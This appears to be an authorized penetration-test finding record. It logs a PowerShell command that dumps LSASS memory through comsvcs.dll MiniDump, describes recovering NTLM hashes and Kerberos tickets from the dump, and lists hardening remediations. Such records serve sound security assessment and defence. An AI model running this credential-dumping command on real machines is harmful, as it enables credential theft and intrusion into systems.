engagement.scope: Authorized internal penetration test — access, lateral movement and local privilege escalation.
engagement.capture_method: Every command fieldkit ran against a target was captured verbatim (command, output and exit code) in the engagement database as it executed.

steps.cmd: powershell -c "rundll32 C:\windows\system32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Temp\l.dmp full"

_recce.remediation: Enable LSASS as a protected process (RunAsPPL) and/or Credential Guard; restrict SeDebugPrivilege; deploy EDR to detect memory access to LSASS.
_recce.description: LSASS process memory was dumped (e.g. via comsvcs.dll MiniDump) and parsed offline to recover NTLM hashes and/or Kerberos tickets.
